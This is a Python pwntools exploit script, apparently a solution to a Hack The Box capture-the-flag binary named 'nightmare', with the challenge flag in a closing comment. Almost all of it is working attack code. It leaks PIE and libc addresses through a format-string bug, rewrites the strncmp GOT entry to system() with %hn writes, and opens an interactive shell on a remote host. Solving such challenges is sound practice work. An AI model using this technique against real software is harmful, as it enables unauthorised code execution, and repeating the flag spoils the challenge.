from pwn import *
import time

LOCAL = False
if LOCAL:
    r = process('./nightmare')
else:
    r = remote('94.237.54.176',30679)
elf = ELF('./nightmare')
""" r.sendlineafter("> ", "1") """
""" r.sendlineafter(">> ", b"B" * 0x100) """

r.sendlineafter("> ", "2")
r.sendlineafter(">> ", "%p")
pie_leak = int(r.recvline().decode().strip('\n')[2:],16)
""" if LOCAL: """
pie_offset = 0x558e6ee46079 - 0x558e6ee44000 
""" else: """
print("leak: ", hex(pie_leak))
pie_base = pie_leak - pie_offset
strncmp_got = pie_base + elf.got['strncmp']

r.sendlineafter("> ", "2")
r.sendlineafter(">> ", "%13$p")
leak = int(r.recvline().decode().strip('\n')[2:],16)
print(hex(leak))
if LOCAL:
    offset = 0x7fb7c8753083 - 0x7fb7c872f000
else: 
    offset = 0x0270b3
base = leak - offset
print(hex(base))
if LOCAL:
    system = base + 0x52290
else:
    system = base + 0x55410
print("system: ", hex(system))

lower = system & 0xffff
higher = (system & 0xffff0000) >> 16
print(hex(lower), hex(higher))

r.sendlineafter("> ", "123") # not sure why this is needed to reset the code
""" r.sendlineafter("> ", "123") # not sure why this is needed to reset the code """

r.sendlineafter("> ", "1")
# NOTE: first arg on stack is 5 
""" r.sendlineafter(">> ", b'AAAA%6$n' + p64(strncmp_got)) """ # successful write 
padding = b'A' *4
lower_write = b"%" + str(lower - len(padding)).encode() + b"x" # 7 characters
fstr = b'%7$hn'
total = len(padding) + len(lower_write) + len(fstr) % 8
print("total len: ", total)
assert total % 8 == 0
print(lower_write)
""" input() """
""" gdb.attach(r) """
""" time.sleep(1) """

r.sendlineafter(">> ", padding + lower_write + fstr + p64(strncmp_got))  

padding = b'B' * 4
upper_write = b"%"+ str(higher - len(padding)).encode() + b"x"
fstr = b'%7$hn'
total = len(padding) + len(upper_write) + len(fstr)
print("total: ", total)
assert total % 8 == 0
strncmp_high = strncmp_got+2
r.sendlineafter("> ", "1")
r.sendlineafter(">> ", padding + upper_write + fstr + p64(strncmp_high))


print("strncmp_got: ", hex(strncmp_got))

r.sendlineafter("> ", "2")
r.sendlineafter(">> ", b'\sh\x00')

""" to_write = int.to_bytes(strncmp_got, length=8, byteorder='little') + b'%7$ln' """
""" r.sendlineafter("> ", "1") """
""" r.sendlineafter(">> ", to_write) """
""""""
r.interactive()

# flag: HTB{ar3_y0u_w0k3_y3t!?}

